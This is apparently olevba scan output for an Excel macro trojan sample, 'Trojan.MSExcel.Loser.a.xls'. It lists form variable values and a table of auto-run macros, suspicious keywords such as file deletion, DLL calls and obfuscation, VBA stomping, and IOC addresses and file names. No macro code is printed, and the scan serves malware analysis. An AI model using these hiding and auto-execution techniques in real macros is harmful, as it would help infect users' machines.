- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRight'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Sure'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRest'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Content'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'O1'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O2'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O3'" IN 'Trojan.MSExcel.Loser.a.xls' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |cmdStart_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |140.112.1.6         |IPv4 address                                 |
|IOC       |192.192.35.34       |IPv4 address                                 |
|IOC       |203.64.35.100       |IPv4 address                                 |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |STKIT432.DLL        |Executable file name                         |
|IOC       |Msheart.exe         |Executable file name                         |
|IOC       |Freecell.exe        |Executable file name                         |
|IOC       |Sol.exe             |Executable file name                         |
|IOC       |Emm386.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

